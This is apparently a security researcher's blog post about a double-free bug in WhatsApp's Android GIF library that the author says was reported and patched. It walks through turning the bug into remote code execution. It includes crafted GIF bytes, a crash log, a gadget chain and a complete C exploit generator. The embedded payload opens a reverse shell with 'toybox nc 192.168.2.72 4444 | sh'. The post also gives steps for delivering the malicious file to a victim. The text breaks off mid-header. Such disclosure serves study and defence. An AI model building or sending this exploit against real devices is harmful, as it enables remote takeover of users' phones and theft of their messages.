---
title:  "How a double-free bug in WhatsApp turns to RCE"
date:   2019-10-02 12:24:15 +0800
categories: Hacking
classes:
  - landing
header:
  teaser: /assets/img/whatsapp.png
---

In this blog post, I'm going to share about a double-free vulnerability that I discovered in WhatsApp, and how I turn it into an RCE. I informed this to Facebook. Facebook acknowledged and patched it officially in WhatsApp version 2.19.244. WhatsApp users, please do update to latest WhatsApp version (2.19.244 or above) to get rid of this bug.

## Demo

[https://drive.google.com/file/d/1T-v5XG8yQuiPojeMpOAG6UGr2TYpocIj/view](https://drive.google.com/file/d/1T-v5XG8yQuiPojeMpOAG6UGr2TYpocIj/view)

## Double-free vulnerability in DDGifSlurp in decoding.c in libpl_droidsonroids_gif

When a WhatsApp user opens Gallery view in WhatsApp to send a media file, WhatsApp parses it with a native library called `libpl_droidsonroids_gif.so` to generate the preview of the GIF file. `libpl_droidsonroids_gif.so` is an open-source library with source codes available at [https://github.com/koral--/android-gif-drawable/tree/dev/android-gif-drawable/src/main/c](https://github.com/koral--/android-gif-drawable/tree/dev/android-gif-drawable/src/main/c).

A GIF file contains multiple encoded frames. To store the decoded frames, a buffer with name rasterBits is used. If all frames have the same size, rasterBits is re-used to store the decoded frames without re-allocation. However, rasterBits would be re-allocated if one of three conditions below is met:

- width * height > originalWidth * originalHeight
- width - originalWidth > 0
- height - originalHeight > 0

Re-allocation is a combination of free and malloc. If the size of the re-allocation is 0, it is simply a free. Let say we have a GIF file that contains 3 frames that have sizes of 100, 0 and 0.
- After the first re-allocation, we have info->rasterBits buffer of size 100.
- In the second re-allocation of 0, info->rasterBits buffer is freed.
- In the third re-allocation of 0, info->rasterBits is freed again.

This results in a double-free vulnerability. The triggering location can be found in decoding.c:
```c
int_fast32_t widthOverflow = gifFilePtr->Image.Width - info->originalWidth;
int_fast32_t heightOverflow = gifFilePtr->Image.Height - info->originalHeight;
const uint_fast32_t newRasterSize =
        gifFilePtr->Image.Width * gifFilePtr->Image.Height;
if (newRasterSize > info->rasterSize || widthOverflow > 0 ||
    heightOverflow > 0) {
    void *tmpRasterBits = reallocarray(info->rasterBits, newRasterSize,     <<-- double-free here
                                       sizeof(GifPixelType));
    if (tmpRasterBits == NULL) {
        gifFilePtr->Error = D_GIF_ERR_NOT_ENOUGH_MEM;
        break;
    }
    info->rasterBits = tmpRasterBits;
    info->rasterSize = newRasterSize;
}
```

In Android, a double-free of a memory with size N leads to two subsequent memory-allocation of size N returning the same address.
```
(lldb) expr int $foo = (int) malloc(112)
(lldb) p/x $foo
(int) $14 = 0xd379b250
 
(lldb) p (int)free($foo)
(int) $15 = 0
 
(lldb) p (int)free($foo)
(int) $16 = 0
 
(lldb) p/x (int)malloc(12)
(int) $17 = 0xd200c350
 
(lldb) p/x (int)malloc(96)
(int) $18 = 0xe272afc0
 
(lldb) p/x (int)malloc(180)
(int) $19 = 0xd37c30c0
 
(lldb) p/x (int)malloc(112)
(int) $20 = 0xd379b250
 
(lldb) p/x (int)malloc(102)
(int) $21 = 0xd379b250
```

In the above snippet, variable $foo was freed twice. As a result, the next two allocations ($20 and $21) return the same address.

Now look at struct GifInfo in gif.h
```c
struct GifInfo {
    void (*destructor)(GifInfo *, JNIEnv *);  <<-- there's a function pointer here
    GifFileType *gifFilePtr;
    GifWord originalWidth, originalHeight;
    uint_fast16_t sampleSize;
    long long lastFrameRemainder;
    long long nextStartTime;
    uint_fast32_t currentIndex;
    GraphicsControlBlock *controlBlock;
    argb *backupPtr;
    long long startPos;
    unsigned char *rasterBits;
    uint_fast32_t rasterSize;
    char *comment;
    uint_fast16_t loopCount;
    uint_fast16_t currentLoop;
    RewindFunc rewindFunction;   <<-- there's another function pointer here
    jfloat speedFactor;
    uint32_t stride;
    jlong sourceLength;
    bool isOpaque;
    void *frameBufferDescriptor;
};
```
We then craft a GIF file with three frames of below sizes:
- sizeof(GifInfo)
- 0
- 0

When the WhatsApp Gallery is opened, the said GIF file triggers the double-free bug on rasterBits buffer with size `sizeof(GifInfo)`. Interestingly, in WhatsApp Gallery, a GIF file is parsed twice. When the said GIF file is parsed again, another GifInfo object is created. Bacause of the double-free behavior in Android, GifInfo `info` object and `info->rasterBits` will point to the same address. DDGifSlurp() will then decode the first frame to `info->rasterBits` buffer, thus overwriting `info` and its `rewindFunction()`, which is called right at the end of DDGifSlurp() function.

## Controlling PC register
The GIF file that we need to craft is as below:

```
47 49 46 38 39 61 18 00 0A 00 F2 00 00 66 CC CC 
FF FF FF 00 00 00 33 99 66 99 FF CC 00 00 00 00 
00 00 00 00 00 2C 00 00 00 00 08 00 15 00 00 08 
9C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 F0 CE 57 2B 6F EE FF FF 2C 00 00 
00 00 1C 0F 00 00 00 00 2C 00 00 00 00 1C 0F 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 2C 00 00 00 00 
18 00 0A 00 0F 00 01 00 00 3B
```
It contains four frames:
- Frame 1:
```
2C 00 00 00 00 08 00 15 00 00 08 9C 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
F0 CE 57 2B 6F EE FF FF
```
- Frame 2:
```
2C 00 00 00 00 1C 0F 00 00 00 00
```
- Frame 3:
```
2C 00 00 00 00 1C 0F 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00
```
- Frame 4:
```
2C 00 00 00 00 18 00 0A 00 0F 00 01 00 00
```
The below sequence is what happened when WhatsApp Gallery is opened:
- First parse:
	- Init:
		- GifInfo *info = malloc(168);
	- Frame 1:
		- info->rasterBits = reallocarray(info->rasterBits, 0x8*0x15, 1);
	- Frame 2:
		- info->rasterBits = reallocarray(info->rasterBits, 0x0*0xf1c, 1);
	- Frame 3:
		- info->rasterBits = reallocarray(info->rasterBits, 0x0*0xf1c, 1);
	- Frame 4:
		- does not matter, it is there to make this GIF file valid
- Second parse:
	- Init:
		- GifInfo *info = malloc(168);
	- Frame 1:
		- info->rasterBits = reallocarray(info->rasterBits, 0x8*0x15, 1);
	- Frame 2, 3, 4:
		- does not matter
	- End:
		- info->rewindFunction(info);

Because of the double-free bug occuring in the first parse, `info` and `info->rasterBits` now points to the same location. With the first frame crafted as said, we could control rewindFunction and PC when `info->rewindFunction(info);` is called.
Take note that the frames are all LZW encoded. We must use an LZW encoder to encode the frames. 
The above GIF triggers crash as below:
```
--------- beginning of crash
10-02 11:09:38.460 17928 18059 F libc    : Fatal signal 6 (SIGABRT), code -6 in tid 18059 (image-loader), pid 17928 (com.whatsapp)
10-02 11:09:38.467  1027  1027 D QCOM PowerHAL: LAUNCH HINT: OFF
10-02 11:09:38.494 18071 18071 I crash_dump64: obtaining output fd from tombstoned, type: kDebuggerdTombstone
10-02 11:09:38.495  1127  1127 I /system/bin/tombstoned: received crash request for pid 17928
10-02 11:09:38.497 18071 18071 I crash_dump64: performing dump of process 17928 (target tid = 18059)
10-02 11:09:38.497 18071 18071 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
10-02 11:09:38.497 18071 18071 F DEBUG   : Build fingerprint: 'google/taimen/taimen:8.1.0/OPM1.171019.011/4448085:user/release-keys'
10-02 11:09:38.497 18071 18071 F DEBUG   : Revision: 'rev_10'
10-02 11:09:38.497 18071 18071 F DEBUG   : ABI: 'arm64'
10-02 11:09:38.497 18071 18071 F DEBUG   : pid: 17928, tid: 18059, name: image-loader  >>> com.whatsapp <<<
10-02 11:09:38.497 18071 18071 F DEBUG   : signal 6 (SIGABRT), code -6 (SI_TKILL), fault addr --------
10-02 11:09:38.497 18071 18071 F DEBUG   :     x0   0000000000000000  x1   000000000000468b  x2   0000000000000006  x3   0000000000000008
10-02 11:09:38.497 18071 18071 F DEBUG   :     x4   0000000000000000  x5   0000000000000000  x6   0000000000000000  x7   7f7f7f7f7f7f7f7f
10-02 11:09:38.497 18071 18071 F DEBUG   :     x8   0000000000000083  x9   0000000010000000  x10  0000007da3c81cc0  x11  0000000000000001
10-02 11:09:38.497 18071 18071 F DEBUG   :     x12  0000007da3c81be8  x13  ffffffffffffffff  x14  ff00000000000000  x15  ffffffffffffffff
10-02 11:09:38.497 18071 18071 F DEBUG   :     x16  00000055b111efa8  x17  0000007e2bb3452c  x18  0000007d8ba9bad8  x19  0000000000004608
10-02 11:09:38.497 18071 18071 F DEBUG   :     x20  000000000000468b  x21  0000000000000083  x22  0000007da3c81e48  x23  00000055b111f3f0
10-02 11:09:38.497 18071 18071 F DEBUG   :     x24  0000000000000040  x25  0000007d8bbff588  x26  00000055b1120670  x27  000000000000000b
10-02 11:09:38.497 18071 18071 F DEBUG   :     x28  00000055b111f010  x29  0000007da3c81d00  x30  0000007e2bae9760
10-02 11:09:38.497 18071 18071 F DEBUG   :     sp   0000007da3c81cc0  pc   0000007e2bae9788  pstate 0000000060000000
10-02 11:09:38.499 18071 18071 F DEBUG   :
10-02 11:09:38.499 18071 18071 F DEBUG   : backtrace:
10-02 11:09:38.499 18071 18071 F DEBUG   :     #00 pc 000000000001d788  /system/lib64/libc.so (abort+120)
10-02 11:09:38.499 18071 18071 F DEBUG   :     #01 pc 0000000000002fac  /system/bin/app_process64 (art::SignalChain::Handler(int, siginfo*, void*)+1012)
10-02 11:09:38.499 18071 18071 F DEBUG   :     #02 pc 00000000000004ec  [vdso:0000007e2e4b0000]
10-02 11:09:38.499 18071 18071 F DEBUG   :     #03 pc deadbeeefffffffc  <unknown>
```

## Deal with ASLR and W^X
After controlling the PC, to achieve remote code execution. In Android, we can not execute code on non-executable regions (i.e. stack and heap). The easiest way to to execute the below command:
```
system("toybox nc 192.168.2.72 4444 | sh");
```
For that, we need PC to point to `system()` function in libc.so and X0 to point to `"toybox nc 192.168.2.72 4444 | sh"`.
This cannot be done directly. We need to first let PC jumps to an intermediate gadget, which sets X0 to point to `"toybox nc 192.168.2.72 4444 | sh"` and jump to `system()`.
From the disassembly code around info->rewindFunction, we can see that both X0 and X19 point to info->rasterBits (or info, because they both point to the same location), while X8 is actually info->rewindFunction.

![Disassembly around info->rewindFunction](https://github.com/awakened1712/awakened1712.github.io/raw/master/assets/img/whatsapp1.PNG)

There is a gadget in libhwui.so that perfectly satisfies our purpose:
```
ldr x8, [x19, #0x18]
add x0, x19, #0x20
blr x8
```
Let say the address of the above gadget is AAAAAAAA and the address of system() function is BBBBBBBB. The rasterBits buffer (frame 1) before LZW encoding look as below:
```
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 4242 4242 4242 4242  ........BBBBBBBB
00000020: 746f 7962 6f78 206e 6320 3139 322e 3136  toybox nc 192.16
00000030: 382e 322e 3732 2034 3434 3420 7c20 7368  8.2.72 4444 | sh
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 4141 4141 4141 4141 eeff                 AAAAAAAA..
```
Now to find out AAAAAAAA and BBBBBBBB, we need an information disclosure vulnerability that gives us the base address of libc.so and libhwui.so. That vulnerability is not in the scope of this blogpost.

## Putting everything together

Just compile the code that I attached in the Appendix. Note that the address of `system()` and the gadget must be replaced by the actual address found by an information disclosure vulnerability (which is not covered in this blog post).
```
    /*
    Gadget g1:
        ldr x8, [x19, #0x18]
        add x0, x19, #0x20
        blr x8
    */
    size_t g1_loc = 0x7cb81f0954;  <<-- replace this
    memcpy(buffer + 128, &g1_loc, 8);

    size_t system_loc = 0x7cb602ce84; <<-- replace this
    memcpy(buffer + 24, &system_loc, 8);
```

Run the code to generate the corrupted GIF file:
```
notroot@osboxes:~/Desktop/gif$ gcc -o exploit egif_lib.c exploit.c
.....
.....
.....
notroot@osboxes:~/Desktop/gif$ ./exploit
buffer = 0x7ffc586cd8b0 size = 266
47 49 46 38 39 61 18 00 0A 00 F2 00 00 66 CC CC
FF FF FF 00 00 00 33 99 66 99 FF CC 00 00 00 00
00 00 00 00 00 2C 00 00 00 00 08 00 15 00 00 08
9C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 84 9C 09 B0
C5 07 00 00 00 74 DE E4 11 F3 06 0F 08 37 63 40
C4 C8 21 C3 45 0C 1B 38 5C C8 70 71 43 06 08 1A
34 68 D0 00 C1 07 C4 1C 34 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 54 12 7C C0 C5 07 00 00 00 EE FF FF 2C 00 00
00 00 1C 0F 00 00 00 00 2C 00 00 00 00 1C 0F 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 2C 00 00 00 00
18 00 0A 00 0F 00 01 00 00 3B
```
Then copy the content into a GIF file and send it as Document with WhatsApp to another WhatsApp user. Take note that it must not be sent as a Media file, otherwise WhatsApp tries to convert it into an MP4 before sending.
Upon the user receives the malicous GIF file, nothing will happen until the user open WhatsApp Gallery to send a media file to his/her friend.

## Affected versions
The exploit works well until WhatsApp version 2.19.230. The vulnerability is official patched in WhatsApp version 2.19.244

The exploit works well for Android 8.1 and 9.0, but does not work for Android 8.0 and below. In the older Android versions, double-free could still be triggered. However, because of the malloc calls by the system after the double-free, the app just crashes before reaching to the point that we could control the PC register.

## Attack vector
With the above exploitation, we can have two attack vectors:

1. Local privilege escaltion (from a user app to WhatsApp): A malicious app is installed on the Android device. The app collects addresses of zygote libraries and generates a malicious GIF file that results in code execution in WhatsApp context. This allows the malware app to steal files in WhatsApp sandbox including message database.
2. Remote code execution: Pairing with an application that has an remote memory information disclosure vulnerability (e.g. browser), the attacker can collect the addresses of zygote libraries and craft a malicious GIF file to send it to the user via WhatsApp (must be as an attachment, not as an image through Gallery Picker). When the user opens the Gallery view in WhatsApp, the GIF file will trigger a remote shell in WhatsApp context.

## Appendix

exploit.c
```c
#include "gif_lib.h"

#define ONE_BYTE_HEX_STRING_SIZE   3
static inline void
get_hex(char *buf, int buf_len, char* hex_, int hex_len, int num_col) {
    int i;
    unsigned int byte_no = 0;
    if (buf_len <= 0) {
        if (hex_len > 0) {
            hex_[0] = '\0';
        }
        return;
    }
    if(hex_len < ONE_BYTE_HEX_STRING_SIZE + 1)
        return;
    do {
        for (i = 0; ((i < num_col) && (buf_len > 0) && (hex_len > 0)); ++i ) {
            snprintf(hex_, hex_len, "%02X ", buf[byte_no++] & 0xff);
            hex_ += ONE_BYTE_HEX_STRING_SIZE;
            hex_len -=ONE_BYTE_HEX_STRING_SIZE;
            buf_len--;
        }
        if (buf_len > 1) {
            snprintf(hex_, hex_len, "\n");
            hex_ += 1;
        }
    } while ((buf_len) > 0 && (hex_len > 0));
}

int genLine_0(unsigned char *buffer) {
/*
    00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000010: 0000 0000 0000 0000 4242 4242 4242 4242  ........BBBBBBBB
    00000020: 746f 7962 6f78 206e 6320 3139 322e 3136  toybox nc 192.16
    00000030: 382e 322e 3732 2034 3434 3420 7c20 7368  8.2.72 4444 | sh
    00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000080: 4141 4141 4141 4141 eeff                 AAAAAAAA..

    Over-write AAAAAAAA with address of gadget 1
    Over-write BBBBBBBB with address of system() function

    Gadget 1
    ldr x8, [x19, #0x18]
    add x0, x19, #0x20
    blr x8
*/
    unsigned char hexData[138] = {
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0xEF, 0xBE, 0xAD, 0xDE, 0xEE, 0xFF
    };
    memcpy(buffer, hexData, sizeof(hexData));

    /*
    Gadget g1:
        ldr x8, [x19, #0x18]
        add x0, x19, #0x20
        blr x8
    */
    size_t g1_loc = 0x7cb81f0954;
    memcpy(buffer + 128, &g1_loc, 8);

    size_t system_loc = 0x7cb602ce84;
    memcpy(buffer + 24, &system_loc, 8);

    char *command = "toybox nc 192.168.2.72 4444 | sh";
    memcpy(buffer + 32, command, strlen(command));

    return sizeof(hexData);
};

int main(int argc, char *argv[]) {
    GifFilePrivateType Private = {
            .Buf[0] = 0,
            .BitsPerPixel = 8,
            .ClearCode = 256,
            .EOFCode = 257,
            .RunningCode = 258,
            .RunningBits = 9,
            .MaxCode1 = 512,
            .CrntCode = FIRST_CODE,
            .CrntShiftState = 0,
            .CrntShiftDWord = 0,
            .PixelCount = 112,
            .OutBuf = { 0 },
            .OutBufLen = 0
    };
    int size = 0;
    unsigned char buffer[1000] = { 0 };

    unsigned char line[500] = { 0 };
    int line_size = genLine_0(line);
    EGifCompressLine(&Private, line, line_size);

    unsigned char starting[48] = {
            0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x18, 0x00, 0x0A, 0x00, 0xF2, 0x00, 0x00, 0x66, 0xCC, 0xCC,
            0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x33, 0x99, 0x66, 0x99, 0xFF, 0xCC, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x15, 0x00, 0x00, 0x08
    };
    unsigned char padding[2] = { 0xFF, 0xFF };
    unsigned char ending[61] = {
            0x2C, 0x00, 0x00, 0x00, 0x00, 0x1C, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
            0x1C, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00,
            0x00, 0x00, 0x00, 0x18, 0x00, 0x0A, 0x00, 0x0F, 0x00, 0x01, 0x00, 0x00, 0x3B
    };

    // starting bytes
    memcpy(buffer + size, starting, sizeof(starting));
    size += sizeof(starting);

    // size of encoded line + padding
    int tmp = Private.OutBufLen + sizeof(padding);
    buffer[size++] = tmp;

    // encoded-line bytes
    memcpy(buffer + size, Private.OutBuf, Private.OutBufLen);
    size += Private.OutBufLen;

    // padding bytes of 0xFFs to trigger info->rewind(info);
    memcpy(buffer + size, padding, sizeof(padding));
    size += sizeof(padding);

    // ending bytes
    memcpy(buffer + size, ending, sizeof(ending));
    size += sizeof(ending);

    char hex_dump[5000];
    get_hex(buffer, size, hex_dump, 5000, 16);
    printf("buffer = %p size = %d\n%s\n", buffer, size, hex_dump);
}
```
egif_lib.c
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "gif_lib.h"

static int EGifBufferedOutput(GifFilePrivateType *Private, int c) {
    Private->Buf[0] = 0;
    Private->Buf[++(Private->Buf[0])] = c;
    Private->OutBuf[Private->OutBufLen++] = c;
    return GIF_OK;
}

static int EGifCompressOutput(GifFilePrivateType *Private, const int Code)
{
    int retval = GIF_OK;

    if (Code == FLUSH_OUTPUT) {
        while (Private->CrntShiftState > 0) {
            /* Get Rid of what is left in DWord, and flush it. */
            if (EGifBufferedOutput(Private, Private->CrntShiftDWord & 0xff) == GIF_ERROR)
                retval = GIF_ERROR;
            Private->CrntShiftDWord >>= 8;
            Private->CrntShiftState -= 8;
        }
        Private->CrntShiftState = 0;    /* For next time. */
        if (EGifBufferedOutput(Private, FLUSH_OUTPUT) == GIF_ERROR)
            retval = GIF_ERROR;
    } else {
        Private->CrntShiftDWord |= ((long)Code) << Private->CrntShiftState;
        Private->CrntShiftState += Private->RunningBits;
        while (Private->CrntShiftState >= 8) {
            /* Dump out full bytes: */
            if (EGifBufferedOutput(Private, Private->CrntShiftDWord & 0xff) == GIF_ERROR)
                retval = GIF_ERROR;
            Private->CrntShiftDWord >>= 8;
            Private->CrntShiftState -= 8;
        }
    }

    /* If code cannt fit into RunningBits bits, must raise its size. Note */
    /* however that codes above 4095 are used for special signaling.      */
    if (Private->RunningCode >= Private->MaxCode1 && Code <= 4095) {
        Private->MaxCode1 = 1 << ++Private->RunningBits;
    }

    return retval;
}

int EGifCompressLine(GifFilePrivateType *Private, unsigned char *Line, const int LineLen)
{
    int i = 0, CrntCode, NewCode;
    unsigned long NewKey;
    GifPixelType Pixel;

    if (Private->CrntCode == FIRST_CODE)    /* Its first time! */
        CrntCode = Line[i++];
    else
        CrntCode = Private->CrntCode;    /* Get last code in compression. */

    while (i < LineLen) {   /* Decode LineLen items. */
        Pixel = Line[i++];  /* Get next pixel from stream. */

        if (EGifCompressOutput(Private, CrntCode) == GIF_ERROR) {
            return GIF_ERROR;
        }
        CrntCode = Pixel;

        /* If however the HashTable if full, we send a clear first and
         * Clear the hash table.
         */
        if (Private->RunningCode >= LZ_MAX_CODE) {
            /* Time to do some clearance: */
            if (EGifCompressOutput(Private, Private->ClearCode)
                == GIF_ERROR) {
                return GIF_ERROR;
            }
            Private->RunningCode = Private->EOFCode + 1;
            Private->RunningBits = Private->BitsPerPixel + 1;
            Private->MaxCode1 = 1 << Private->RunningBits;
        }

    }

    /* Preserve the current state of the compression algorithm: */
    Private->CrntCode = CrntCode;

    if (Private->PixelCount == 0) {
        /* We are done - output last Code and flush output buffers: */
        if (EGifCompressOutput(Private, CrntCode) == GIF_ERROR) {
            return GIF_ERROR;
        }
        if (EGifCompressOutput(Private, Private->EOFCode) == GIF_ERROR) {
            return GIF_ERROR;
        }
        if (EGifCompressOutput(Private, FLUSH_OUTPUT) == GIF_ERROR) {
            return GIF_ERROR;
        }
    }

    return GIF_OK;
}
```
gif.h
```c
/******************************************************************************
 
gif_lib.h - service library for decoding and encoding GIF images
                                                                             
*****************************************************************************/

#ifndef _GIF_LIB_H_
#define _GIF_LIB_H_ 1

#define GIF_ERROR   0
#define GIF_OK      1

#include <stddef.h>
#include <stdbool.h>

typedef signed char __int8_t;
typedef unsigned char __uint8_t;
typedef short __int16_t;
typedef unsigned short __uint16_t;
typedef int __int32_t;
typedef unsigned int __uint32_t;
#if defined(__LP64__)
typedef long __int64_t;
typedef unsigned long __uint64_t;
#else
typedef long long __int64_t;
typedef unsigned long long __uint64_t;
#endif
#if defined(__LP64__)
typedef long __intptr_t;
typedef unsigned long __uintptr_t;
#else
typedef int __intptr_t;
typedef unsigned int __uintptr_t;
#endif
typedef __int8_t      int8_t;
typedef __uint8_t     uint8_t;
typedef __int16_t     int16_t;
typedef __uint16_t    uint16_t;
typedef __int32_t     int32_t;
typedef __uint32_t    uint32_t;
typedef __int64_t     int64_t;
typedef __uint64_t    uint64_t;
typedef __intptr_t    intptr_t;
typedef __uintptr_t   uintptr_t;
typedef int8_t        int_least8_t;
typedef uint8_t       uint_least8_t;
typedef int16_t       int_least16_t;
typedef uint16_t      uint_least16_t;
typedef int32_t       int_least32_t;
typedef uint32_t      uint_least32_t;
typedef int64_t       int_least64_t;
typedef uint64_t      uint_least64_t;
typedef int8_t        int_fast8_t;
typedef uint8_t       uint_fast8_t;
typedef int64_t       int_fast64_t;
typedef uint64_t      uint_fast64_t;
#if defined(__LP64__)
typedef int64_t       int_fast16_t;
typedef uint64_t      uint_fast16_t;
typedef int64_t       int_fast32_t;
typedef uint64_t      uint_fast32_t;
#else
typedef int32_t       int_fast16_t;
typedef uint32_t      uint_fast16_t;
typedef int32_t       int_fast32_t;
typedef uint32_t      uint_fast32_t;
#endif

#define GIF_STAMP "GIFVER"          /* First chars in file - GIF stamp.  */
#define GIF_STAMP_LEN sizeof(GIF_STAMP) - 1
#define GIF_VERSION_POS 3           /* Version first character in stamp. */

typedef unsigned char GifPixelType;
typedef unsigned char GifByteType;
typedef unsigned int GifPrefixType;
typedef uint_fast16_t GifWord;

typedef struct GifColorType {
	uint8_t Red, Green, Blue;
} GifColorType;

typedef struct ColorMapObject {
	uint_fast16_t ColorCount;
	uint_fast8_t BitsPerPixel;
//    bool SortFlag;
	GifColorType *Colors;    /* on malloc(3) heap */
} ColorMapObject;

typedef struct GifImageDesc {
	GifWord Left, Top, Width, Height;   /* Current image dimensions. */
	bool Interlace;
	/* Sequential/Interlaced lines. */
	ColorMapObject *ColorMap;           /* The local color map */
} GifImageDesc;

//typedef struct ExtensionBlock {
//    int ByteCount;
//    GifByteType *Bytes; /* on malloc(3) heap */
//    int Function;       /* The block function code */
#define CONTINUE_EXT_FUNC_CODE    0x00    /* continuation subblock */
#define COMMENT_EXT_FUNC_CODE     0xfe    /* comment */
#define GRAPHICS_EXT_FUNC_CODE    0xf9    /* graphics control (GIF89) */
#define PLAINTEXT_EXT_FUNC_CODE   0x01    /* plaintext */
#define APPLICATION_EXT_FUNC_CODE 0xff    /* application block */
//} ExtensionBlock;

typedef struct SavedImage {
	GifImageDesc ImageDesc;
//    GifByteType *RasterBits;         /* on malloc(3) heap */
//    int ExtensionBlockCount;         /* Count of extensions before image */
//    ExtensionBlock *ExtensionBlocks; /* Extensions before image */
} SavedImage;

#define EXTENSION_INTRODUCER      0x21
#define DESCRIPTOR_INTRODUCER     0x2c
#define TERMINATOR_INTRODUCER     0x3b

#define LZ_MAX_CODE         4095    /* Biggest code possible in 12 bits. */
#define LZ_BITS             12

#define FLUSH_OUTPUT        4096    /* Impossible code, to signal flush. */
#define FIRST_CODE          4097    /* Impossible code, to signal first. */
#define NO_SUCH_CODE        4098    /* Impossible code, to signal empty. */

//#define FILE_STATE_WRITE    0x01
//#define FILE_STATE_SCREEN   0x02
//#define FILE_STATE_IMAGE    0x04
//#define FILE_STATE_READ     0x08

//#define IS_READABLE(Private)    (Private->FileState & FILE_STATE_READ)


struct GifFileType;
/* func type to read gif data from arbitrary sources (TVT) */
typedef uint_fast8_t (*InputFunc)(struct GifFileType *, GifByteType *, uint_fast8_t);

typedef struct GifFilePrivateType {
	GifWord //FileState, /*FileHandle,*/  /* Where all this data goes to! */
			BitsPerPixel,     /* Bits per pixel (Codes uses at least this + 1). */
			ClearCode,   /* The CLEAR LZ code. */
			EOFCode,     /* The EOF LZ code. */
			RunningCode, /* The next code algorithm can generate. */
			RunningBits, /* The number of bits required to represent RunningCode. */
			MaxCode1,    /* 1 bigger than max. possible code, in RunningBits bits. */
			LastCode,    /* The code before the current code. */
            CrntCode,    /* Current algorithm code. */
			StackPtr,    /* For character stack (see below). */
			CrntShiftState;
	/* Number of bits in CrntShiftDWord. */
	unsigned long CrntShiftDWord;
	/* For bytes decomposition into codes. */
	uint_fast32_t PixelCount;
	/* Number of pixels in image. */
//    FILE *File;
	/* File as stream. */
	InputFunc Read;     /* function to read gif input (TVT) */
//    OutputFunc Write;   /* function to write gif output (MRB) */
	GifByteType Buf[256];
	unsigned char OutBuf[500];
	int OutBufLen;
	/* Compressed input is buffered here. */
	GifByteType Stack[LZ_MAX_CODE];
	/* Decoded pixels are stacked here. */
	GifByteType Suffix[LZ_MAX_CODE + 1];
	/* So we can trace the codes. */
	GifPrefixType Prefix[LZ_MAX_CODE + 1];
//    bool gif89;
} GifFilePrivateType;

typedef struct GifFileType {
